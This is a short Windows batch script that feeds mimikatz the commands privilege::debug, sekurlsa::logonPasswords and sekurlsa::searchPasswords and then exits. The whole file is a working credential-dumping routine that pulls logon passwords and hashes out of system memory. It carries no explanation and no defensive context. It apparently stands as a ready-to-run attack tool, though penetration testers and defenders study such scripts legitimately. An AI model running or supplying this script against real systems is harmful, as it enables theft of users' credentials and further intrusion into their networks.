@echo off
echo privilege::debug > actions
echo sekurlsa::logonPasswords >> actions
echo sekurlsa::searchPasswords >> actions
echo exit >> actions

type actions | .\mimikatz.exe

